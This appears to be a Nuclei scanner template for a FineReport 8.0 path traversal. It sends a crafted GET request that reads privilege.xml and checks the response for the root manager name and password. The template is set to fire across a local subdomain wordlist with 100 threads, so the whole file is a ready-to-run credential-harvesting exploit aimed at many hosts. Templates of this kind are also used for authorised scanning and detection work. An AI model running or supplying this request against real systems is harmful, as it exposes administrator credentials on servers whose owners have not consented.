id: finereport-path-traversal 1

info:
  name: FineReport 8.0 Path Traversal
  author: pikpikcu
  severity: medium
  reference: http://foreversong.cn/archives/1378
  tags: finereport,lfi

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<rootManagerName>"
          - "<rootManagerPassword>"
        part: body
        condition: and

      - type: status
        status:
          - 200
